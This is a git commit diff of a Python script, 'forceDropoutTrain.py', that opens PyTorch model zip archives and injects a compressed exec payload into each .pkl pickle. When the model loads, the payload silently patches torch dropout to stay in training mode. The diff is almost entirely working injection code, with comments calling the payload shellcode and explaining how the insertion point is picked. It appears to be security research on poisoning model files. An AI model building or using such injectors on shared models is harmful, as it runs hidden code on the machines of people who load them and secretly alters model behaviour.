5af4d416308ea585573187f631b194dd4dcec52d
coldwaterq <coldwaterq@users.noreply.github.com>
2024-01-11 13:55:35 -0800

    Update forceDropoutTrain.py

--- forceDropoutTrain.py
+++ forceDropoutTrain.py
@@ -5,12 +5,13 @@ import os
 import random
 import zlib
 import struct
+import zipfile
 
 # Open the files
 inf, outf, pos = None, None, None
 try:
-    inf = open(sys.argv[1],'rb')
-    outf = open(sys.argv[2],'wb')
+    infname = sys.argv[1]
+    outfname = sys.argv[2]
 except Exception as e:
     print(e)
     print('{} inputFile outputFile'.format(sys.argv[0]))
@@ -32,39 +33,64 @@ except Exception as e:
 # 94282396: R                                                REDUCE
 # 94282397: 0                                                POP
 # 94282398: \x80                                             PROTO      4
-code = b'def _train_(self, mode=True):\n    torch.nn.Module.train(self, True)\n\ntorch.nn._DropoutNd.train = _train_'
-data = zlib.compress(code,level=9)
-payload = bytearray(b'\x80\x02c__builtin__\nexec\n(czlib\ndecompress\n(B'+struct.pack("<I",len(data))+data+b'tRtR0\x80')
+code = b'def _train_(self, mode=True):\n    torch.nn.Module.train(self, True)\n\ntorch.nn.modules.dropout._DropoutNd.train = _train_'
 
-# dissasemble the target pickle and get potential locations
-temp = tempfile.TemporaryFile("w+")
-locations = []
-while inf.tell() != os.fstat(inf.fileno()).st_size:
-    try:
-        pickletools.dis(inf, temp)
-        temp.seek(0)
-        version = int(temp.read().partition('highest protocol among opcodes = ')[2].partition('\n')[0])
-        temp.seek(0)
-        tempLocations = [location.partition(":")[0] for location in temp.read().split('\n')]
-        for location in tempLocations:
+
+
+tempzip = tempfile.TemporaryFile("wb+")
+outzf = zipfile.ZipFile(tempzip, 'w')
+zf = zipfile.ZipFile(infname)
+for fname in zf.namelist():
+    if fname.endswith('.pkl'):
+        # Open the files
+        pos = None
+        inf = zf.open(fname,'r')
+        outf = outzf.open(fname,'w')
+        data = zlib.compress(code,level=9)
+        payload = bytearray(b'\x80\x02c__builtin__\nexec\n(czlib\ndecompress\n(B'+struct.pack("<I",len(data))+data+b'tRtR0\x80')
+        
+        # dissasemble the target pickle and get potential locations
+        temp = tempfile.TemporaryFile("w+")
+        locations = []
+        while True: #wait for exception, at least eof
             try:
-                locations.append((int(location),version))
-            except ValueError as e:
-                pass
-    except Exception as e:
-        print(e)
-        break
+                pickletools.dis(inf, temp)
+                temp.seek(0)
+                version = int(temp.read().partition('highest protocol among opcodes = ')[2].partition('\n')[0])
+                temp.seek(0)
+                tempLocations = [location.partition(":")[0] for location in temp.read().split('\n')]
+                for location in tempLocations:
+                    try:
+                        locations.append((int(location),version))
+                    except ValueError as e:
+                        pass
+            except Exception as e:
+                print(e)
+                break
+        
+        # pick the seccond location, we want it early enough to override dropout before it's used
+        pos, version = locations[2]
+            
+        # append the version so that it is set at the end. the shell code doesn't define what it's being set back to until this point.
+        payload.append(version)
+        
+        
+        # simply write the target to the output file up to the injection location, write the shellcode to the output, and then write everything left in the target to the output.
+        inf.seek(0)
+        print("injecting at",pos)
+        outf.write(inf.read(pos))
+        outf.write(payload)
+        outf.write(inf.read())
+    else:
+        inf = zf.open(fname,'r')
+        outf = outzf.open(fname,'w')
+        outf.write(inf.read())
+    inf.close()
+    outf.close()
 
-# pick the seccond location, we want it early enough to override dropout before it's used
-pos, version = locations[2]
-    
-# append the version so that it is set at the end. the shell code doesn't define what it's being set back to until this point.
-payload.append(version)
+zf.close()
+outzf.close()
+tempzip.seek(0)
+open(outfname,'wb').write(tempzip.read())
 
 
-# simply write the target to the output file up to the injection location, write the shellcode to the output, and then write everything left in the target to the output.
-inf.seek(0)
-print("injecting at",pos)
-outf.write(inf.read(pos))
-outf.write(payload)
-outf.write(inf.read())
